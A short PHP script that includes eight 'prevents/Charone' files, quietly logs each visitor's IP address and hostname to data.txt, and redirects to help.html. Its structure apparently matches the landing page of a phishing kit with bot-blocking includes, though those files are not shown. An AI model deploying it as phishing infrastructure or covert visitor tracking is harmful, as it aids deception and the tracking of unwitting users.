<?php


include 'prevents/Charone1.php';
include 'prevents/Charone2.php';
include 'prevents/Charone3.php';
include 'prevents/Charone4.php';
include 'prevents/Charone5.php';
include 'prevents/Charone6.php';
include 'prevents/Charone7.php';
include 'prevents/Charone8.php';
$today         = getdate();
$date          = '' . $today['weekday'] . ' - ' . $today['mday'] . ' ' . $today['month'] . ' ' . $today['year'] . ' - ' . $today['hours'] . ':' . $today['minutes'] . ':' . $today['seconds'] . '';
$file = fopen("data.txt", "a");
    fwrite($file, $date . " : " . $_SERVER['REMOTE_ADDR'] . " - " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\n");
    fclose($file);
    
header('location:help.html')

?>